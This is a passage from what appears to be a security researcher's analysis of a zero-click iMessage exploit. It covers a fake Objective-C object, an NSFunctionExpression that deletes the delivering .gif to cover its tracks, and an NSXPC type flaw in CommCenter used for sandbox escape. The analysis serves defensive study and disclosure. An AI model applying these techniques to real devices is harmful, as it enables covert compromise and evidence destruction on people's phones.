 <p class="YDzVciBUld-c4"><span>Prior to iOS 14.5 the </span><span class="YDzVciBUld-c0">isa</span><span>&nbsp;field of an Objective-C object was not protected by Pointer Authentication Codes (</span><span class="YDzVciBUld-c0">PAC)</span><span>, </span><span>so the JBIG2 machine builds a fake Objective-C object with a fake </span><span class="YDzVciBUld-c0">isa</span><span>&nbsp;such that the invocation of the </span><span class="YDzVciBUld-c0">dealloc</span><span>&nbsp;selector causes the deserialization and evaluation of the </span><span class="YDzVciBUld-c0">NSFunctionExpression</span><span>. This is very similar to the technique used by </span><span class="YDzVciBUld-c6"><a class="YDzVciBUld-c111" href="https://googleprojectzero.blogspot.com/2020/01/remote-iphone-exploitation-part-3.html">Samuel in the 2020 SLOP post</a></span><span class="YDzVciBUld-c2 YDzVciBUld-c3">. </span></p>
 <p class="YDzVciBUld-c1"><span class="YDzVciBUld-c2 YDzVciBUld-c3"></span></p>
 <p class="YDzVciBUld-c4"><span>This </span><span class="YDzVciBUld-c0">NSFunctionExpression</span><span class="YDzVciBUld-c2 YDzVciBUld-c3">&nbsp;has two purposes:</span></p>
 <p class="YDzVciBUld-c1"><span class="YDzVciBUld-c2 YDzVciBUld-c3"></span></p>
 <p class="YDzVciBUld-c4"><span>Firstly, it allocates and leaks an </span><span class="YDzVciBUld-c0">ASMKeepAlive</span><span>&nbsp;object then tries to cover its tracks by finding and deleting the </span><span class="YDzVciBUld-c0">.gif</span><span class="YDzVciBUld-c2 YDzVciBUld-c3">&nbsp;file which delivered the exploit.</span></p>
 <p class="YDzVciBUld-c1"><span class="YDzVciBUld-c2 YDzVciBUld-c3"></span></p>
 <p class="YDzVciBUld-c4"><span>Secondly, it builds a payload </span><span class="YDzVciBUld-c0">NSPredicate</span><span>&nbsp;object then triggers a logic bug to get that </span><span class="YDzVciBUld-c0">NSPredicate</span><span>&nbsp;object evaluated in the </span><span class="YDzVciBUld-c0">CommCenter</span><span>&nbsp;process, reachable from the </span><span class="YDzVciBUld-c0">IMTranscoderAgent</span><span>&nbsp;sandbox via the </span><span class="YDzVciBUld-c0">com.apple.commcenter.xpc</span><span>&nbsp;</span><span class="YDzVciBUld-c0">NSXPC</span><span class="YDzVciBUld-c2 YDzVciBUld-c3">&nbsp;service.</span></p>
 <p class="YDzVciBUld-c1"><span class="YDzVciBUld-c2 YDzVciBUld-c3"></span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c3">Let&#39;s look at those two parts separately:</span></p><h2 class="YDzVciBUld-c7" id="h.t2uistlubhwq"><span class="YDzVciBUld-c9 YDzVciBUld-c3">Covering tracks</span></h2>
 <p class="YDzVciBUld-c4"><span>The outer level </span><span class="YDzVciBUld-c0">NSFunctionExpression</span><span>&nbsp;calls </span><span class="YDzVciBUld-c0">performSelectorOnMainThread:withObject:waitUntilDone</span><span>&nbsp;which in turn calls </span><span class="YDzVciBUld-c0">makeObjectsPerformSelector:@&quot;expressionValueWithObject:context:&quot;</span><span>&nbsp;on an </span><span class="YDzVciBUld-c0">NSArray</span><span>&nbsp;of four </span><span class="YDzVciBUld-c0">NSFunctionExpressions</span><span>. This allows the four independent </span><span class="YDzVciBUld-c0">NSFunctionExpressions</span><span>&nbsp;to be evaluated sequentially.</span></p>
 <p class="YDzVciBUld-c1"><span class="YDzVciBUld-c2 YDzVciBUld-c3"></span></p>
 <p class="YDzVciBUld-c4"><span>With some manual cleanup we can recover pseudo-Objective-C versions of the serialized </span><span class="YDzVciBUld-c0">NSFunctionExpressions</span><span class="YDzVciBUld-c2 YDzVciBUld-c3">. </span></p>
 <p class="YDzVciBUld-c1"><span class="YDzVciBUld-c2 YDzVciBUld-c3"></span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c3">The first one does this:</span></p>
 <p class="YDzVciBUld-c1"><span class="YDzVciBUld-c2 YDzVciBUld-c3"></span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">[[AMSKeepAlive alloc] initWithName:&quot;KA&quot;]</span></p>
 <p class="YDzVciBUld-c1"><span class="YDzVciBUld-c2 YDzVciBUld-c3"></span></p>
 <p class="YDzVciBUld-c4"><span>This allocates and then </span><span>leaks an </span><span class="YDzVciBUld-c0">AppleMediaServices</span><span>&nbsp;</span><span class="YDzVciBUld-c0">KeepAlive</span><span>&nbsp;object</span><span>. The exact purpose of this is unclear.</span></p>
 <p class="YDzVciBUld-c1"><span class="YDzVciBUld-c2 YDzVciBUld-c3"></span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c3">The second entry does this:</span></p>
 <p class="YDzVciBUld-c1"><span class="YDzVciBUld-c2 YDzVciBUld-c3"></span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">[[NSFileManager defaultManager] _web_removeFileOnlyAtPath: </span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">&nbsp; [@&quot;/tmp/com.apple.messages&quot; stringByAppendingPathComponent:</span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">&nbsp; &nbsp; [ [ [ [</span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; [NSFileManager defaultManager]</span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; enumeratorAtPath: @&quot;/tmp/com.apple.messages&quot;</span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ]</span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; allObjects</span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">&nbsp; &nbsp; &nbsp; &nbsp; ]</span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">&nbsp; &nbsp; &nbsp; &nbsp; filteredArrayUsingPredicate:</span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; [</span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; [NSPredicate predicateWithFormat:</span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; [</span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; [@&quot;SELF ENDSWITH &#39;&quot;</span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; stringByAppendingString: &quot;XXX.gif&quot;]</span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; stringByAppendingString: &quot;&#39;&quot;</span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">&nbsp; &nbsp; &nbsp; ] &nbsp; ] ] ]</span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">&nbsp; &nbsp; &nbsp; firstObject</span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">&nbsp; &nbsp; ]</span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">&nbsp; ]</span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">]</span></p>
 <p class="YDzVciBUld-c1"><span class="YDzVciBUld-c2 YDzVciBUld-c0"></span></p>
 <p class="YDzVciBUld-c4"><span>Reading these single expression </span><span class="YDzVciBUld-c0">NSFunctionExpressions</span><span class="YDzVciBUld-c2 YDzVciBUld-c3">&nbsp;is a little tricky; breaking that down into a more procedural form it&#39;s equivalent to this:</span></p>
 <p class="YDzVciBUld-c1"><span class="YDzVciBUld-c2 YDzVciBUld-c3"></span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">NSFileManager* fm = [NSFileManager defaultManager];</span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">NSDirectoryEnumerator* dir_enum;</span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">dir_enum = [fm enumeratorAtPath: @&quot;/tmp/com.apple.messages&quot;]</span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">NSArray* allTmpFiles = [dir_enum allObjects];</span></p>
 <p class="YDzVciBUld-c1"><span class="YDzVciBUld-c2 YDzVciBUld-c0"></span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">NSString* filter;</span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">filter = [&quot;@&quot;SELF ENDSWITH &#39;&quot; stringByAppendingString: &quot;XXX.gif&quot;];</span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">filter = [filter stringByAppendingString: &quot;&#39;&quot;];</span></p>
 <p class="YDzVciBUld-c1"><span class="YDzVciBUld-c2 YDzVciBUld-c0"></span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">NSPredicate* pred;</span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">pred = [NSPredicate predicateWithFormat: filter]</span></p>
 <p class="YDzVciBUld-c1"><span class="YDzVciBUld-c2 YDzVciBUld-c0"></span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">NSArray* matches;</span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">matches = [allTmpFiles filteredArrayUsingPredicate: pred];</span></p>
 <p class="YDzVciBUld-c1"><span class="YDzVciBUld-c2 YDzVciBUld-c0"></span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">NSString* gif_subpath = [matches firstObject];</span></p>
 <p class="YDzVciBUld-c1"><span class="YDzVciBUld-c2 YDzVciBUld-c0"></span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">NSString* root = @&quot;/tmp/com.apple.messages&quot;;</span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">NSString* full_path;</span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">full_path = [root stringByAppendingPathComponent: gifSubpath];</span></p>
 <p class="YDzVciBUld-c1"><span class="YDzVciBUld-c2 YDzVciBUld-c0"></span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">[fm _web_removeFileOnlyAtPath: full_path];</span></p>
 <p class="YDzVciBUld-c1"><span class="YDzVciBUld-c2 YDzVciBUld-c3"></span></p>
 <p class="YDzVciBUld-c4"><span>This finds the </span><span class="YDzVciBUld-c0">XXX.gif</span><span>&nbsp;file used to deliver the exploit which iMessage has stored somewhere under the </span><span class="YDzVciBUld-c0">/tmp/com.apple.messages</span><span>&nbsp;</span><span>folder and deletes it</span><span>.</span></p>
 <p class="YDzVciBUld-c1"><span class="YDzVciBUld-c2 YDzVciBUld-c3"></span></p>
 <p class="YDzVciBUld-c4"><span>The other two </span><span class="YDzVciBUld-c0">NSFunctionExpressions</span><span>&nbsp;build a payload and then trigger its evaluation in </span><span class="YDzVciBUld-c0">CommCenter</span><span>. For that we need to look at </span><span class="YDzVciBUld-c0">NSXPC</span><span class="YDzVciBUld-c2 YDzVciBUld-c3">.</span></p><h2 class="YDzVciBUld-c7" id="h.3sby3b68al28"><span class="YDzVciBUld-c3 YDzVciBUld-c9">NSXPC</span></h2>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c3">NSXPC is a semi-transparent remote-procedure-call mechanism for Objective-C. It allows the instantiation of proxy objects in one process which transparently forward method calls to the &quot;real&quot; object in another process:</span></p>
 <p class="YDzVciBUld-c1"><span class="YDzVciBUld-c2 YDzVciBUld-c3"></span></p>
 <p class="YDzVciBUld-c4"></p>
  
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c3"><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjOvov7r0oFPPVDeNeBSf3Hspypl5AGeZj30ulogkGLGBXJZoy4lDoiunsF9MptZWtnpCyKST1rrP3JtdyqUCvpsAopFrlqp_3b9EuHUFh9FJqnT3iANV_Esl-InoKip8mUjW3BRjNnPOpaj1dQyfoyr5O8apA4yJzsZcPc5mnTeMEsOcqAZQKBsKr5/s1437/image1%286%29.png" style="display: block; padding: 1em 0;text-align: center;"><img alt="" border="0" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjOvov7r0oFPPVDeNeBSf3Hspypl5AGeZj30ulogkGLGBXJZoy4lDoiunsF9MptZWtnpCyKST1rrP3JtdyqUCvpsAopFrlqp_3b9EuHUFh9FJqnT3iANV_Esl-InoKip8mUjW3BRjNnPOpaj1dQyfoyr5O8apA4yJzsZcPc5mnTeMEsOcqAZQKBsKr5/s1200/image1%286%29.png" style="max-height: 750; max-width: 600px;" title="" /></a></span></p>
 <p class="YDzVciBUld-c16"><span class="YDzVciBUld-c13 YDzVciBUld-c3">https://developer.apple.com/library/archive/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/CreatingXPCServices.html</span></p>
 <p class="YDzVciBUld-c1"><span class="YDzVciBUld-c2 YDzVciBUld-c3"></span></p>
 <p class="YDzVciBUld-c4"><span>I say NSXPC is only semi-transparent because it does enforce some restrictions on what objects are allowed to traverse process boundaries. Any object &quot;exported&quot; via </span><span class="YDzVciBUld-c0">NSXPC</span><span>&nbsp;must also define a </span><span class="YDzVciBUld-c0">protocol</span><span>&nbsp;which designates which methods can be invoked and the allowable types for each argument. The </span><span class="YDzVciBUld-c6"><a class="YDzVciBUld-c111" href="https://developer.apple.com/library/archive/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/CreatingXPCServices.html#//apple_ref/doc/uid/10000172i-SW6-SW7">NSXPC programming guide</a></span><span class="YDzVciBUld-c2 YDzVciBUld-c3">&nbsp;further explains the extra handling required for methods which require collections and other edge cases.</span></p>
 <p class="YDzVciBUld-c1"><span class="YDzVciBUld-c2 YDzVciBUld-c3"></span></p>
 <p class="YDzVciBUld-c4"><span>The low-level serialization used by NSXPC is the same explored by Natalie Silvanovich in her 2019 blog post looking at </span><span class="YDzVciBUld-c6"><a class="YDzVciBUld-c111" href="https://googleprojectzero.blogspot.com/2019/08/the-fully-remote-attack-surface-of.html">the fully-remote attack surface of the iPhone</a></span><span>. An important observation in that post was that </span><span class="YDzVciBUld-c14">subclasses of classes with any level of inheritance are also allowed, as is always the case with NSKeyedUnarchiver deserialization.</span></p>
 <p class="YDzVciBUld-c1"><span class="YDzVciBUld-c2 YDzVciBUld-c3"></span></p>
 <p class="YDzVciBUld-c4"><span>This means that any </span><span class="YDzVciBUld-c0">protocol</span><span class="YDzVciBUld-c2 YDzVciBUld-c3">&nbsp;object which declares a particular type for a field will also, by design, accept any subclass of that type.</span></p>
 <p class="YDzVciBUld-c1"><span class="YDzVciBUld-c2 YDzVciBUld-c3"></span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c3">The logical extreme of this would be that a protocol which declared an argument type of NSObject would allow any subclass, which is the vast majority of all Objective-C classes.</span></p><h2 class="YDzVciBUld-c7" id="h.v64ixuc668lc"><span class="YDzVciBUld-c9 YDzVciBUld-c3">Grep to the rescue</span></h2>
 <p class="YDzVciBUld-c4"><span>This is fairly easy to analyze automatically. Protocols are defined statically so we can just find them and check each one. Tools like </span><span class="YDzVciBUld-c6"><a class="YDzVciBUld-c111" href="https://github.com/nst/RuntimeBrowser/">RuntimeBrowser</a></span><span>&nbsp;and </span><span class="YDzVciBUld-c6"><a class="YDzVciBUld-c111" href="http://stevenygard.com/projects/class-dump/">classdump</a></span><span>&nbsp;can parse the static protocol definitions and output human-readable source code. Grepping the output of RuntimeBrowser like this is sufficient to find dozens of cases of </span><span class="YDzVciBUld-c0">NSObject</span><span>&nbsp;</span><span class="YDzVciBUld-c2 YDzVciBUld-c3">pointers in Objective-C protocols:</span></p>
 <p class="YDzVciBUld-c1"><span class="YDzVciBUld-c2 YDzVciBUld-c3"></span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">&nbsp; $ egrep -Rn &quot;\(NSObject \*\)arg&quot; *</span></p>
 <p class="YDzVciBUld-c1"><span class="YDzVciBUld-c2 YDzVciBUld-c3"></span></p>
 <p class="YDzVciBUld-c4"><span>Not all the results are necessarily exposed via </span><span class="YDzVciBUld-c0">NSXPC</span><span>, but some clearly are, including the following two matches in </span><span class="YDzVciBUld-c0">CoreTelephony.framework</span><span class="YDzVciBUld-c2 YDzVciBUld-c3">:</span></p>
 <p class="YDzVciBUld-c1"><span class="YDzVciBUld-c2 YDzVciBUld-c3"></span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">Frameworks/CoreTelephony.framework/\</span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">CTXPCServiceSubscriberInterface-Protocol.h:39:</span></p>
 <p class="YDzVciBUld-c1"><span class="YDzVciBUld-c2 YDzVciBUld-c0"></span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">-(void)evaluateMobileSubscriberIdentity:</span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">&nbsp; &nbsp; &nbsp; &nbsp; (CTXPCServiceSubscriptionContext *)arg1</span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">&nbsp; &nbsp; &nbsp; &nbsp;identity:(NSObject *)arg2</span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">&nbsp; &nbsp; &nbsp; &nbsp;completion:(void (^)(NSError *))arg3;</span></p>
 <p class="YDzVciBUld-c1"><span class="YDzVciBUld-c2 YDzVciBUld-c0"></span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">Frameworks/CoreTelephony.framework/\</span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">CTXPCServiceCarrierBundleInterface-Protocol.h:13:</span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">-(void)setWiFiCallingSettingPreferences:</span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;(CTXPCServiceSubscriptionContext *)arg1</span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">&nbsp; &nbsp; &nbsp; &nbsp;key:(NSString *)arg2</span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">&nbsp; &nbsp; &nbsp; &nbsp;value:(NSObject *)arg3</span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">&nbsp; &nbsp; &nbsp; &nbsp;completion:(void (^)(NSError *))arg4;</span></p>
 <p class="YDzVciBUld-c1"><span class="YDzVciBUld-c2 YDzVciBUld-c3"></span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c0">evaluateMobileSubscriberIdentity</span><span>&nbsp;string appears in the list of selector-like strings we first saw when running strings on the </span><span class="YDzVciBUld-c0">bplist00</span><span>. Indeed, looking at the parsed and beautified </span><span class="YDzVciBUld-c0">NSFunctionExpression</span><span class="YDzVciBUld-c2 YDzVciBUld-c3">&nbsp;we see it doing this:</span></p>
 <p class="YDzVciBUld-c1"><span class="YDzVciBUld-c2 YDzVciBUld-c3"></span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">[ [ [CoreTelephonyClient alloc] init]</span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">&nbsp; context:X</span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">&nbsp; evaluateMobileSubscriberIdentity:Y]</span></p>
 <p class="YDzVciBUld-c1"><span class="YDzVciBUld-c2 YDzVciBUld-c3"></span></p>
 <p class="YDzVciBUld-c4"><span>This is a wrapper around the lower-level </span><span class="YDzVciBUld-c0">NSXPC</span><span>&nbsp;code and the argument passed as </span><span class="YDzVciBUld-c0">Y</span><span>&nbsp;above to the CoreTelephonyClient method corresponds to the </span><span class="YDzVciBUld-c0">identity:(NSObject *)arg2</span><span>&nbsp;argument passed via </span><span class="YDzVciBUld-c0">NSXPC</span><span>&nbsp;to </span><span class="YDzVciBUld-c0">CommCenter</span><span>&nbsp;(which is the process that hosts </span><span class="YDzVciBUld-c0">com.apple.commcenter.xpc</span><span>, the </span><span class="YDzVciBUld-c0">NSXPC</span><span>&nbsp;service underlying the </span><span class="YDzVciBUld-c0">CoreTelephonyClient</span><span>). Since the parameter is explicitly named as </span><span class="YDzVciBUld-c0">NSObject*</span><span>&nbsp;we can in fact pass any subclass of </span><span class="YDzVciBUld-c0">NSObject*</span><span>, including an </span><span class="YDzVciBUld-c0">NSPredicate</span><span class="YDzVciBUld-c2 YDzVciBUld-c3">! Game over?</span></p><h2 class="YDzVciBUld-c7" id="h.7ums8k4ivkbp"><span class="YDzVciBUld-c9 YDzVciBUld-c3">Parsing vs Evaluation</span></h2>
 <p class="YDzVciBUld-c4"><span>It&#39;s not quite that easy. The </span><span class="YDzVciBUld-c6"><a class="YDzVciBUld-c111" href="https://blog.chichou.me/2021/01/16/see-no-eval-runtime-code-execution-objc/">DezhouInstrumentz writeup</a></span><span>&nbsp;discusses this attack surface and notes that there&#39;s an extra, specific mitigation. When an </span><span class="YDzVciBUld-c0">NSPredicate</span><span>&nbsp;is deserialized by its </span><span class="YDzVciBUld-c0">initWithCoder:</span><span>&nbsp;implementation it sets a flag which disables evaluation of the predicate until the </span><span class="YDzVciBUld-c0">allowEvaluation</span><span class="YDzVciBUld-c2 YDzVciBUld-c3">&nbsp;method is called.</span></p>
 <p class="YDzVciBUld-c1"><span class="YDzVciBUld-c2 YDzVciBUld-c3"></span></p>
 <p class="YDzVciBUld-c4"><span>So whilst you certainly can pass an </span><span class="YDzVciBUld-c0">NSPredicate*</span><span>&nbsp;as the </span><span class="YDzVciBUld-c0">identity</span><span>&nbsp;argument across NSXPC and get it deserialized in </span><span class="YDzVciBUld-c0">CommCenter,</span><span>&nbsp;</span><span>the implementation of </span><span class="YDzVciBUld-c0">evaluateMobileSubscriberIdentity:</span><span>&nbsp;in </span><span class="YDzVciBUld-c0">CommCenter</span><span>&nbsp;is definitely not going to call </span><span class="YDzVciBUld-c0">allowEvaluation:</span><span>&nbsp; to make the predicate safe for evaluation then </span><span class="YDzVciBUld-c0">evaluateWithObject:</span><span class="YDzVciBUld-c2 YDzVciBUld-c3">&nbsp;and then evaluate it.</span></p><h2 class="YDzVciBUld-c7" id="h.34h1kqwr3d8t"><span class="YDzVciBUld-c9 YDzVciBUld-c3">Old techniques, new tricks</span></h2>
 <p class="YDzVciBUld-c4"><span>From the exploit we can see that they in fact pass an </span><span class="YDzVciBUld-c0">NSArray</span><span class="YDzVciBUld-c2 YDzVciBUld-c3">&nbsp;with two elements:</span></p>
 <p class="YDzVciBUld-c1"><span class="YDzVciBUld-c2 YDzVciBUld-c3"></span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">[0] = AVSpeechSynthesisVoice</span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">[1] = PTSection {rows = NSArray { [0] = PTRow() }</span></p>
 <p class="YDzVciBUld-c1"><span class="YDzVciBUld-c2 YDzVciBUld-c3"></span></p>
 <p class="YDzVciBUld-c4"><span>The first element is an </span><span class="YDzVciBUld-c0">AVSpeechSynthesisVoice</span><span>&nbsp;object and the second is a </span><span class="YDzVciBUld-c0">PTSection</span><span>&nbsp;containing a single </span><span class="YDzVciBUld-c0">PTRow</span><span class="YDzVciBUld-c2 YDzVciBUld-c3">. Why?</span></p>
 <p class="YDzVciBUld-c1"><span class="YDzVciBUld-c2 YDzVciBUld-c3"></span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c0">PTSection</span><span>&nbsp;and </span><span class="YDzVciBUld-c0">PTRow</span><span>&nbsp;are both defined in the </span><span class="YDzVciBUld-c0">PrototypeTools</span><span>&nbsp;private framework. </span><span class="YDzVciBUld-c0">PrototypeTools</span><span>&nbsp;isn&#39;t loaded in the </span><span class="YDzVciBUld-c0">CommCenter</span><span>&nbsp;target process. Let&#39;s look at what happens when an </span><span class="YDzVciBUld-c0">AVSpeechSynthesisVoice</span><span class="YDzVciBUld-c2 YDzVciBUld-c3">&nbsp;is deserialized:</span></p><h2 class="YDzVciBUld-c7" id="h.ihjz2r1jcklz"><span>Finding a voice</span></h2>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c0">AVSpeechSynthesisVoice</span><span>&nbsp;is implemented in </span><span class="YDzVciBUld-c0">AVFAudio.framework</span><span>, which </span><span class="YDzVciBUld-c14">is</span><span>&nbsp;loaded in </span><span class="YDzVciBUld-c0">CommCenter</span><span class="YDzVciBUld-c2 YDzVciBUld-c3">:</span></p>
 <p class="YDzVciBUld-c1"><span class="YDzVciBUld-c2 YDzVciBUld-c3"></span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">$ sudo vmmap `pgrep CommCenter` | grep AVFAudio</span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">__TEXT &nbsp;7ffa22c4c000-7ffa22d44000 r-x/r-x SM=COW \</span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">/System/Library/Frameworks/AVFAudio.framework/Versions/A/AVFAudio</span></p>
 <p class="YDzVciBUld-c1"><span class="YDzVciBUld-c2 YDzVciBUld-c3"></span></p>
 <p class="YDzVciBUld-c4"><span>Assuming that this was the first time that an </span><span class="YDzVciBUld-c0">AVSpeechSynthesisVoice</span><span>&nbsp;object was created inside CommCenter (which is quite likely) the Objective-C runtime will call the </span><span class="YDzVciBUld-c0">initialize</span><span>&nbsp;method on the </span><span class="YDzVciBUld-c0">AVSpeechSynthesisVoice</span><span>&nbsp;class </span><span class="YDzVciBUld-c6"><a class="YDzVciBUld-c111" href="https://developer.apple.com/documentation/objectivec/nsobject/1418639-initialize?language=objc">before instantiating the first instance</a></span><span class="YDzVciBUld-c2 YDzVciBUld-c3">.</span></p>
 <p class="YDzVciBUld-c1"><span class="YDzVciBUld-c2 YDzVciBUld-c3"></span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c0">[AVSpeechSynthesisVoice initialize]</span><span>&nbsp;has a </span><span class="YDzVciBUld-c0">dispatch_once</span><span class="YDzVciBUld-c2 YDzVciBUld-c3">&nbsp;block with the following code:</span></p>
 <p class="YDzVciBUld-c1"><span class="YDzVciBUld-c2 YDzVciBUld-c3"></span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">NSBundle* bundle;</span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">bundle = [NSBundle bundleWithPath:</span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;@&quot;/System/Library/AccessibilityBundles/\</span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;AXSpeechImplementation.bundle&quot;];</span></p>
 <p class="YDzVciBUld-c1"><span class="YDzVciBUld-c2 YDzVciBUld-c0"></span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">if (![bundle isLoaded]) {</span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">&nbsp; &nbsp; NSError err;</span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">&nbsp; &nbsp; [bundle loadAndReturnError:&amp;err]</span></p>
